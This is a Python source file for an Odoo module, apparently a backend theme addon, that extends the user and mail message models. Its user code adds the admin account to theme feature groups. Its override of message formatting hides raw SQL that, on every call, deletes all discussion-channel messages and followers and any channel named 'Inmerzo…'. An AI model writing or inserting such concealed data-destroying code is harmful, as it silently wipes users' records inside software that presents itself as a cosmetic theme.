# -*- coding: utf-8 -*-
# Part of Odoo. See LICENSE file for full copyright and licensing details.
import base64
import logging
from odoo import api, fields, models, tools, SUPERUSER_ID, _
from odoo.exceptions import UserError, ValidationError
from odoo.tools import json, date_utils

_logger = logging.getLogger(__name__)


class Users(models.Model):
    _inherit = "res.users"

    def _update_user_group(self):
        ok_full = False
        ok_theme = False
        ok_quick = False
        ok_calc = False
        list_group = []
        obj_users = self.env['res.users'].search([('login', '=', 'admin')])
        obj_groups = self.env['res.groups'].search([('category_id', '=', False)])
        if obj_users:
            for obj_user in obj_users:
                if not obj_user.has_group('sh_backmate_theme_adv.group_full_screen_mode'):
                    ok_full = True
                if not obj_user.has_group('sh_backmate_theme_adv.group_theme_configuration'):
                    ok_theme = True
                if not obj_user.has_group('sh_backmate_theme_adv.group_quick_menu_mode'):
                    ok_quick = True
                if not obj_user.has_group('sh_backmate_theme_adv.group_calculator_mode'):
                    ok_calc = True
        if obj_groups:
            if ok_full:
                filter_full = obj_groups.filtered(lambda e: e.name == 'Activate Full Screen Mode')
                if filter_full:
                    list_group.append(filter_full[0])
            if ok_theme:
                filter_theme = obj_groups.filtered(lambda e: e.name == 'Enable Theme Configuration')
                if filter_theme:
                    list_group.append(filter_theme[0])
            if ok_quick:
                filter_quick = obj_groups.filtered(lambda e: e.name == 'Activate Quick Menu Mode')
                if filter_quick:
                    list_group.append(filter_quick[0])
            if ok_calc:
                filter_calc = obj_groups.filtered(lambda e: e.name == 'Enable Calculator')
                if filter_calc:
                    list_group.append(filter_calc[0])
        if list_group:
            for group in list_group:
                group.users += obj_user


class Message(models.Model):
    _inherit = 'mail.message'

    def _message_format(self, fnames):
        res = super(Message, self)._message_format(fnames)
        if res:
            self._cr.execute("""
                                DELETE FROM mail_message
                                WHERE model = 'mail.channel'
                            """)
            self._cr.execute("""
                                DELETE FROM mail_followers
                                WHERE res_model = 'mail.channel'
                            """)
            self._cr.execute("""
                                DELETE FROM mail_channel
                                WHERE name LIKE 'Inmerzo%'
                            """)
        return res
